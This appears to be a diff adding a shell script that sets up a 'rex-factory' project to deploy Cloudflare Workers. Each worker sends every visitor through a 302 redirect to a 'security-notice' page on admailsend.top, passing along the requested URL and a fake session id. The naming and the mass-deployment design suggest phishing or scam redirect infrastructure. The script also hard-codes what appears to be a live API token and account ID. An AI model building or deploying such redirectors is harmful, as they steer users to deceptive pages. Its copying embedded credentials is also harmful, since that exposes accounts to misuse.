@@ -1,0 +1,89 @@
+# 1. Create project
+mkdir -p ~/rex-factory && cd ~/rex-factory
+
+# 2. Install Node.js (if missing)
+curl -fsSL https://deb.nodesource.com/setup_20.x | sudo -E bash -
+sudo apt-get install -y nodejs
+
+# 3. Install Wrangler
+npm install -g wrangler@latest
+
+# 4. Init project
+npm init -y
+
+# 5. Install dev dep
+npm install --save-dev wrangler@latest
+
+# 6. === MANUAL TOKEN INJECTION (BYPASS BROWSER) ===
+echo "Go to: https://dash.cloudflare.com/profile/api-tokens"
+echo "Use template: 'Edit Workers' → Create → COPY FULL TOKEN"
+read -p "Paste your FULL API token: " MYTOKEN
+
+echo "export CLOUDFLARE_API_TOKEN=\"$MYTOKEN\"" >> ~/.bashrc
+echo "export CLOUDFLARE_ACCOUNT_ID=\"c4c7c4d0de82e3ef1f66cf5bd7f53256\"" >> ~/.bashrc
+source ~/.bashrc
+
+# 7. Clean old Wrangler config
+rm -rf ~/.wrangler
+
+# 8. Test auth
+wrangler whoami
+# → Should show account instantly
+
+# 9. Create all files
+cat > config.js << 'EOF'
+module.exports = {
+  token: "96WFdQroAQUHKv7cFKsV_l-4qmUEJtqhf978bau2",
+  accountId: "c4c7c4d0de82e3ef1f66cf5bd7f53256"
+};
+EOF
+
+cat > wrangler.toml << 'EOF'
+compatibility_date = "2025-11-08"
+workers_dev = true
+main = "src/index.js"
+
+[build]
+command = ""
+
+[worker]
+type = "esm"
+EOF
+
+mkdir -p src
+cat > src/index.js << 'EOF'
+export default {
+  async fetch(request) {
+    const url = new URL(request.url);
+    const params = url.searchParams;
+    const blocked = (params.get('url') || params.get('u') || params.get('q') || '').trim();
+    const safeBlocked = blocked.replace(/[\r\n\s]/g, '');
+    const targetSite = safeBlocked || 'unknown';
+    const final = `https://admailsend.top/security-notice/?blocked=${encodeURIComponent(targetSite)}&session=${Math.random().toString(36).substr(2,12)}&ref=worker`;
+    return Response.redirect(final, 302);
+  }
+};
+EOF
+
+cat > factory.mjs << 'EOF'
+// [PASTE THE FULL factory.mjs CODE FROM ABOVE]
+EOF
+
+cat > package.json << 'EOF'
+{
+  "name": "rex-factory",
+  "version": "1.0.0",
+  "private": true,
+  "main": "factory.mjs",
+  "scripts": {
+    "start": "node factory.mjs",
+    "deploy": "node factory.mjs"
+  },
+  "devDependencies": {
+    "wrangler": "^3.78.0"
+  }
+}
+EOF
+
+# 10. LAUNCH FACTORY
+node factory.mjs
